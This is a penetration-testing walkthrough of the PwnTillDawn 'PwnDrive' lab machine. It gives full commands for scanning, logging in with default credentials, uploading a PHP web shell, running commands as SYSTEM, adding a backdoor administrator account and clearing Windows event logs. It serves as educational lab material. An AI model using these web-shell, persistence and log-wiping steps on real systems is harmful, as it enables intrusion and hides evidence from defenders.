# :closed_lock_with_key: Lab3-PwnTillDawn-Walkthrough

## Table of Contents

- [Lab Setup](#lab-setup)
- [Stage 1 - Reconnaissance](#stage-1---reconnaissance)
- [Stage 2 - Scanning & Enumeration](#stage-2---scanning--enumeration)
- [Stage 3 - Gaining Access](#stage-3---gaining-access)
- [Stage 4 - Establishing a Foothold](#stage-4---establishing-a-foothold)
- [Stage 5 - Capturing the Flag](#stage-5---capturing-the-flag)
- [Stage 6 - Maintain Access](#stage-6---maintain-access)
- [Stage 7 - Covering Tracks & Clean Up](#stage-7---covering-tracks--clean-up)
- [Conclusion](#conclusion)

A step-by-step penetration testing walkthrough for the *PwnDrive* machine on the PwnTillDawn.

---

## :desktop_computer: Lab Setup

- Attacker Machine: Kali Linux
- Target Machine: PwnDrive Academy (10.150.150.11)
- Network: PwnTillDawnVPN
- Tools Used: OpenVPN, nmap, gobuster, curl

[Download from PwnTillDawn](https://online.pwntilldawn.com/)
![image]()

---
## :mag: Stage 1 - Reconnaissance  
In this stage, the objective is to connect to the lab network and identify the target host.

### Step 1.1 - Connect to the VPN  
Use the `.ovpn` file provided by PwnTillDawn.
```bash
sudo openvpn PwnTillDawn.ovpn
```
![image]()

### Step 1.2 - Discover Live Hosts
Use a ping scan to identify active machines in the target network range.
```bash
sudo nmap -sn 10.150.150.10-254
```
![image]()
> Target machine identified: 10.150.150.11

---
## :door: Step 2 - Scanning & Enumeration
In this stage, the objective is to identify open ports, running services, and web content that may be useful for exploitation.

### Step 2.1 - Port Scanning
Run a full TCP scan with service version detection.
```bash
nmap -sV -p- -T4 10.150.150.11
```
![image]()

**Open Ports Found:**
| Port  | State | Service | Version                                 |
| ----- | ----- | ------- | --------------------------------------- |
| 21    | Open  | FTP     | Xlight ftpd 3.9                         |
| 80    | Open  | HTTP    | Apache httpd 2.4.46 ((Win64) PHP/7.4.9) |
| 135   | Open  | MSRPC   | Microsoft Windows RPC                   |
| 139   | Open  | NetBIOS | Microsoft Windows netbios-ssn           |
| 443   | Open  | HTTPS   | Apache httpd 2.4.46                     |
| 445   | Open  | SMB     | Microsoft Windows Server 2008 R2 - 2012 |
| 1433  | Open  | MSSQL   | Microsoft SQL Server 2012               |
| 3306  | Open  | MySQL   | MariaDB 5.5.5-10.4.14                   |
| 3389  | Open  | RDP     | Terminal Service                        |
| 47001 | Open  | HTTP    | Microsoft HTTPAPI httpd 2.0             |

OS detected:
> Windows Server 2008 R2 - 2012

### Step 2.2 - Browse the Web Application
Access the web server through the browser at `http://10.150.150.11`. It reveals a cloud storage application called "PwnDrive".
![image]()

![image]()

### Step 2.3 - Directory Enumeration
Use Gobuster to perform directory brute-forcing and discover hidden directories and PHP files.
```bash
gobuster dir -u http://10.150.150.11 -w /usr/share/wordlists/dirb/common.txt -x php -t 10 --timeout 30s
```
![image]()
Discovered critical endpoints: `/admin/`, `/upload/`, and `/login.php`.

### Step 2.4 - Review Interesting Pages
Admin Directory: Browsing to `/admin/` shows directory listing is enabled.
![image]()

Upload Directory: Browsing to `/upload/` also shows directory listing.
![image]()

Login Page: The web application contains a login page at `/login.php`.
![image]()

---
## :unlock: Stage 3 - Gaining Access
In this stage, the objective is to bypass or defeat authentication and obtain access to the target application.

### Step 3.1 - Test the Login Form
A first attempt was made to test whether the login form was vulnerable to SQL injection.
```bash
curl -X POST http://10.150.150.11/login.php --data-urlencode "username=admin' OR 1=1 -- " --data-urlencode "password=anything" -i
```
![image]()
> Error received: Char or String "=" is not allowed

### Step 3.2 - Try Default Credentials
Since the login panel looked like an admin portal, default credentials were tested.
```bash
curl -X POST http://10.150.150.11/login.php -d "username=admin&password=admin" -i
```
![image]()
HTTP 302 Redirect to `myfiles.php` confirms successful login with `admin:admin`.

### Step 3.3 - Access the File Dashboard
After login, the application redirects to the file management dashboard.

Observation: The dashboard includes an "Add File" feature, which may allow for a file upload exploit.
![image]()

---
## :computer: Stage 4 - Establishing a Foothold
In this stage, the objective is to gain a more reliable foothold and establish command execution after successful access.

### Step 4.1 - Prepare a Simple PHP Web Shell
Create the payload on the Kali machine.
```bash
echo '<?php system($_GET["cmd"]); ?>' > webshell.php
```
A PHP payload was chosen because the target web application uses PHP pages such as /login.php and /config.php.
![image]()

### Step 4.2 - Upload the Web Shell
Use the Add File feature in the PwnDrive dashboard to upload `webshell.php`.I confirmed using Wappalyzer during the enumeration phase.
![image]()

The file is successfully stored in the `/upload/2/` directory discovered earlier.
![image]()

![image]()

![image]()

### Step 4.3 - Verify Remote Command Execution
Once uploaded, the shell can be accessed through the browser or with cURL.
```bash
curl "http://10.150.150.11/upload/2/webshell.php?cmd=whoami"
```
![image]()

![image]()

The server returns `nt authority\system`. The Apache service is severely misconfigured, granting us immediate highest-level privileges without needing privilege escalation.

---
## :triangular_flag_on_post: Stage 5 - Capturing the Flag
To locate the objective, perform a targeted directory listing on the Administrator's Desktop.

List the files on the Administrator Desktop.
```bash
curl "[http://10.150.150.11/upload/2/webshell.php?cmd=dir%20C](http://10.150.150.11/upload/2/webshell.php?cmd=dir%20C):\Users\Administrator\Desktop"
```
![image]()

![image]()

Then read the flag file.
```bash
curl "http://10.150.150.11/upload/2/webshell.php cmd=type%20C:\Users\Administrator\Desktop\FLAG1.txt"
```
![image]()

![image]()

> :triangular_flag_on_post: **Flag obtained!**

---
## :old_key: Stage 6 - Maintain Access (Optional)
To maintain access even if the uploaded shell is removed, create a new local user and add it to the Administrators group.
```bash
curl "http://10.150.150.11/upload/2/webshell.php?cmd=net%20user%20backdoor%20Pwned123!%20/add"
curl "http://10.150.150.11/upload/2/webshell.php?cmd=net%20localgroup%20Administrators%20backdoor%20/add"
```
![image]()

Verify the account creation:
```bash
curl "http://10.150.150.11/upload/2/webshell.php?cmd=net%20user%20backdoor"
```
![image]()

> Local Group Memberships confirm `*Administrators`.

---
## :broom: Stage 7 - Covering Tracks & Clean Up
In this stage, the goal is to remove artifacts created during the attack and restore the lab as neatly as possible.

1. Delete the backdoor user:
```bash
curl "[http://10.150.150.11/upload/2/webshell.php?cmd=net%20user%20backdoor%20/delete](http://10.150.150.11/upload/2/webshell.php?cmd=net%20user%20backdoor%20/delete)"
```
![image]()

2. Remove the web shell payload:
```bash
curl "http://10.150.150.11/upload/2/webshell.php?cmd=del%20C:\xampp\htdocs\upload\2\webshell.php"
```
![image]()

3. Clear the Windows Event Logs:
```bash
curl "http://10.150.150.11/upload/2/webshell.php?cmd=wevtutil%20cl%20System"
curl "http://10.150.150.11/upload/2/webshell.php?cmd=wevtutil%20cl%20Application"
curl "http://10.150.150.11/upload/2/webshell.php?cmd=wevtutil%20cl%20Security"
```
![image]()

---
## :books: Conclusion
This PwnDrive machine demonstrates several critical penetration testing methodologies and common web vulnerabilities:

- Service enumeration and directory brute-forcing using Nmap and Gobuster.
- Identifying input validation filters during authentication bypass testing.
- Exploiting weak/default administrative credentials.
- Leveraging an Unrestricted File Upload vulnerability to deploy a PHP web shell.
- Achieving immediate Remote Code Execution (RCE) as nt authority\system due to service misconfigurations.
- Employing command-line utilities for post-exploitation data hunting, persistence, and anti-forensic clean-up.


![image]()
